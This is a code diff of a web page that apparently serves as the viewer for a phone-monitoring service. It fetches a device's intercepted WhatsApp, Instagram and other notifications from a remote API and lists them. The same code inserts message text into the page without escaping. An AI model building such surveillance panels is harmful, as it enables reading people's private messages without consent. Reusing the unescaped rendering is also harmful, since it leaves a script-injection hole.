@@ -31,7 +31,7 @@
             background: rgba(0, 0, 0, 0.6);
             border-radius: 30px; padding: 20px;
             border: 1px solid var(--glass-border);
-            min-height: 80vh;
+            height: 85vh; /* Fixed height for scrolling */
             display: flex; flex-direction: column;
             position: relative;
         }
@@ -39,16 +39,18 @@
         /* HEADER */
         .header {
             display: flex; justify-content: space-between; align-items: center;
-            margin-bottom: 20px; border-bottom: 1px solid var(--glass-border);
-            padding-bottom: 15px;
+            margin-bottom: 15px; border-bottom: 1px solid var(--glass-border);
+            padding-bottom: 15px; flex-shrink: 0;
         }
         .back-btn { color: white; font-size: 1.2rem; cursor: pointer; text-decoration: none; }
         .page-title { font-size: 1.1rem; font-weight: bold; color: var(--cyan); letter-spacing: 1px; }
 
         /* FILTER BUTTONS */
         .filter-row {
-            display: flex; gap: 10px; margin-bottom: 15px; overflow-x: auto; padding-bottom: 5px;
+            display: flex; gap: 10px; margin-bottom: 15px; overflow-x: auto; padding-bottom: 5px; flex-shrink: 0;
         }
+        .filter-row::-webkit-scrollbar { display: none; } /* Hide scrollbar */
+        
         .filter-btn {
             background: var(--glass-bg); border: 1px solid var(--glass-border);
             color: var(--text-muted); padding: 6px 15px; border-radius: 20px;
@@ -58,41 +60,46 @@
         .filter-btn:hover { border-color: var(--cyan); }
 
         /* NOTIFICATION LIST */
-        .notif-list { display: flex; flex-direction: column; gap: 10px; overflow-y: auto; flex-grow: 1; }
+        .notif-list { 
+            display: flex; flex-direction: column; gap: 10px; 
+            overflow-y: auto; flex-grow: 1; padding-right: 5px;
+        }
+        /* Scrollbar Styling */
+        .notif-list::-webkit-scrollbar { width: 5px; }
+        .notif-list::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }
         
         .notif-card {
             background: var(--glass-bg); border-radius: 12px; padding: 12px;
             border: 1px solid var(--glass-border); display: flex; gap: 12px;
             transition: 0.2s; position: relative; overflow: hidden;
+            animation: fadeIn 0.3s ease-in-out;
         }
-        .notif-card:hover { transform: translateX(5px); border-color: var(--cyan); background: rgba(255,255,255,0.1); }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .notif-card:hover { transform: translateX(3px); border-color: var(--cyan); background: rgba(255,255,255,0.1); }
 
         .app-icon {
-            width: 40px; height: 40px; border-radius: 10px;
+            width: 35px; height: 35px; border-radius: 10px;
             display: flex; align-items: center; justify-content: center;
-            font-size: 1.2rem; flex-shrink: 0;
+            font-size: 1.1rem; flex-shrink: 0;
         }
 
-        .notif-content { flex: 1; min-width: 0; } /* min-width 0 forces text truncation work */
-        .app-name { font-size: 0.65rem; color: var(--cyan); margin-bottom: 2px; text-transform: uppercase; letter-spacing: 0.5px; }
-        .notif-title { font-size: 0.9rem; font-weight: bold; margin-bottom: 3px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-        .notif-text { font-size: 0.8rem; color: #ccc; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
+        .notif-content { flex: 1; min-width: 0; display: flex; flex-direction: column; justify-content: center; }
         
-        .time-badge {
-            font-size: 0.6rem; color: var(--text-muted); text-align: right;
-            margin-top: 5px; font-style: italic;
-        }
+        .top-row { display: flex; justify-content: space-between; margin-bottom: 2px; }
+        .app-name { font-size: 0.65rem; color: var(--cyan); text-transform: uppercase; font-weight: bold; }
+        .time-badge { font-size: 0.6rem; color: var(--text-muted); }
 
-        /* Loading State */
+        .notif-title { font-size: 0.9rem; font-weight: bold; color: white; margin-bottom: 2px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .notif-text { font-size: 0.8rem; color: #ccc; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; line-height: 1.3; }
+
         .status-msg { text-align: center; color: var(--text-muted); margin-top: 50px; }
 
-        /* Colors for Apps */
-        .whatsapp { background: rgba(37, 211, 102, 0.2); color: #25d366; border: 1px solid #25d366; }
-        .instagram { background: rgba(193, 53, 132, 0.2); color: #c13584; border: 1px solid #c13584; }
-        .facebook { background: rgba(24, 119, 242, 0.2); color: #1877f2; border: 1px solid #1877f2; }
-        .youtube { background: rgba(255, 0, 0, 0.2); color: #ff0000; border: 1px solid #ff0000; }
+        /* Colors */
+        .whatsapp { background: rgba(37, 211, 102, 0.15); color: #25d366; border: 1px solid #25d366; }
+        .instagram { background: rgba(193, 53, 132, 0.15); color: #c13584; border: 1px solid #c13584; }
+        .facebook { background: rgba(24, 119, 242, 0.15); color: #1877f2; border: 1px solid #1877f2; }
         .system { background: rgba(255, 255, 255, 0.1); color: #ffffff; border: 1px solid #ffffff; }
-
     </style>
 </head>
 <body>
@@ -100,9 +107,9 @@
     <div class="container">
         <div class="header">
             <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
-            <span class="page-title"><i class="fa-regular fa-bell"></i> Notifications</span>
-            <div onclick="loadNotifications()" style="cursor: pointer; color: var(--cyan);">
-                <i class="fa-solid fa-rotate-right"></i>
+            <span class="page-title">Notification Log</span>
+            <div onclick="loadNotifications()" style="cursor: pointer; color: var(--cyan); font-size: 1.2rem;">
+                <i class="fa-solid fa-rotate"></i>
             </div>
         </div>
 
@@ -117,121 +124,104 @@
         <div class="notif-list" id="notifContainer">
             <div class="status-msg">
                 <i class="fa-solid fa-spinner fa-spin fa-2x"></i><br><br>
-                Fetching Logs...
+                Connecting...
             </div>
         </div>
     </div>
 
     <script>
         const API_BASE = 'https://child-v9no.onrender.com';
-        
-        // URL se ID uthana
         const urlParams = new URLSearchParams(window.location.search);
         const DEVICE_ID = urlParams.get('id');
 
-        let allNotifications = []; // Data store karne ke liye
+        let allNotifications = []; 
 
-        // Initial Load
         window.onload = () => {
             if(!DEVICE_ID) {
-                document.getElementById('notifContainer').innerHTML = "<p class='status-msg'>Error: No Device ID.</p>";
+                document.getElementById('notifContainer').innerHTML = "<p class='status-msg'>ID Missing!</p>";
                 return;
             }
             loadNotifications();
         };
 
-        // 1. Data Fetch Karna
         async function loadNotifications() {
             const container = document.getElementById("notifContainer");
-            container.innerHTML = "<div class='status-msg'><i class='fa-solid fa-spinner fa-spin'></i> Loading...</div>";
+            container.innerHTML = "<div class='status-msg'><i class='fa-solid fa-spinner fa-spin'></i> Syncing...</div>";
 
             try {
-                // Request Fresh Data
-                // (Optional: Agar command bhejna ho)
-                // fetch(`${API_BASE}/api/send-command`, { method: 'POST', body: JSON.stringify({ device_id: DEVICE_ID, command: 'notifications' }) });
-
                 const response = await fetch(`${API_BASE}/api/get-data/${DEVICE_ID}/notifications?t=${Date.now()}`);
                 const data = await response.json();
 
                 if (!data || data.length === 0) {
-                    container.innerHTML = "<p class='status-msg'>No notifications found yet.</p>";
-                    allNotifications = [];
+                    container.innerHTML = "<p class='status-msg'>No notifications yet.</p>";
                     return;
                 }
 
-                // Reverse taaki nayi notification upar aaye
-                allNotifications = data.reverse(); 
+                // 🔴 IMPORTANT CHANGE: Sorting by Time (Newest First)
+                // b.postTime - a.postTime ka matlab hai jiska time bada (naya) hai wo pehle aayega.
+                allNotifications = data.sort((a, b) => b.postTime - a.postTime);
+                
                 renderList(allNotifications);
 
             } catch (err) {
                 console.error(err);
-                container.innerHTML = "<p class='status-msg' style='color:#ff4444'>Connection Failed.</p>";
+                container.innerHTML = "<p class='status-msg' style='color:#ff4444'>Offline / Error</p>";
             }
         }
 
-        // 2. Data Render Karna
         function renderList(data) {
             const container = document.getElementById("notifContainer");
             container.innerHTML = "";
 
             if(data.length === 0) {
-                container.innerHTML = "<p class='status-msg'>No matching logs found.</p>";
+                container.innerHTML = "<p class='status-msg'>Empty List</p>";
                 return;
             }
 
             data.forEach(item => {
-                // App Details nikalna (Icon & Color)
-                const appDetails = getAppDetails(item.packageName);
-                const timeStr = new Date(parseInt(item.postTime)).toLocaleString();
+                const app = getAppDetails(item.packageName);
+                const timeStr = new Date(parseInt(item.postTime)).toLocaleString([], { hour: '2-digit', minute:'2-digit', day:'numeric', month:'short' });
 
                 const card = document.createElement("div");
                 card.className = "notif-card";
                 card.innerHTML = `
-                    <div class="app-icon ${appDetails.style}">
-                        <i class="${appDetails.icon}"></i>
+                    <div class="app-icon ${app.style}">
+                        <i class="${app.icon}"></i>
                     </div>
                     <div class="notif-content">
-                        <div class="app-name">${appDetails.name}</div>
+                        <div class="top-row">
+                            <span class="app-name">${app.name}</span>
+                            <span class="time-badge">${timeStr}</span>
+                        </div>
                         <div class="notif-title">${item.title || 'Notification'}</div>
-                        <div class="notif-text">${item.text || 'Hidden Content'}</div>
-                        <div class="time-badge">${timeStr}</div>
+                        <div class="notif-text">${item.text || ''}</div>
                     </div>
                 `;
                 container.appendChild(card);
             });
         }
 
-        // 3. App Identification Helper
         function getAppDetails(pkg) {
             pkg = (pkg || "").toLowerCase();
             if (pkg.includes("whatsapp")) return { name: "WhatsApp", icon: "fa-brands fa-whatsapp", style: "whatsapp" };
             if (pkg.includes("instagram")) return { name: "Instagram", icon: "fa-brands fa-instagram", style: "instagram" };
-            if (pkg.includes("facebook") || pkg.includes("katana")) return { name: "Facebook", icon: "fa-brands fa-facebook-f", style: "facebook" };
-            if (pkg.includes("youtube")) return { name: "YouTube", icon: "fa-brands fa-youtube", style: "youtube" };
-            if (pkg.includes("message") || pkg.includes("mms")) return { name: "SMS", icon: "fa-solid fa-comment-dots", style: "system" };
-            if (pkg.includes("dialer") || pkg.includes("call")) return { name: "Call", icon: "fa-solid fa-phone", style: "system" };
-            if (pkg.includes("android.gm")) return { name: "Gmail", icon: "fa-solid fa-envelope", style: "danger" };
-            
-            return { name: pkg.split('.').pop(), icon: "fa-solid fa-bell", style: "system" };
+            if (pkg.includes("facebook")) return { name: "Facebook", icon: "fa-brands fa-facebook-f", style: "facebook" };
+            return { name: "System", icon: "fa-solid fa-bell", style: "system" };
         }
 
-        // 4. Filtering Logic
         function filterList(type, btn) {
-            // Button Styles Update
             document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
             btn.classList.add('active');
 
             if (type === 'all') {
                 renderList(allNotifications);
             } else if (type === 'other') {
-                const filtered = allNotifications.filter(n => {
-                    const pkg = (n.packageName || "").toLowerCase();
-                    return !pkg.includes("whatsapp") && !pkg.includes("instagram") && !pkg.includes("facebook");
-                });
-                renderList(filtered);
+                renderList(allNotifications.filter(n => {
+                    const p = (n.packageName || "").toLowerCase();
+                    return !p.includes("whatsapp") && !p.includes("instagram") && !p.includes("facebook");
+                }));
             } else {
-                const filtered = allNotifications.filter(n => (n.packageName || "").toLowerCase().includes(type));
-                renderList(filtered);
+                renderList(allNotifications.filter(n => (n.packageName || "").toLowerCase().includes(type)));
             }
         }
     </script>
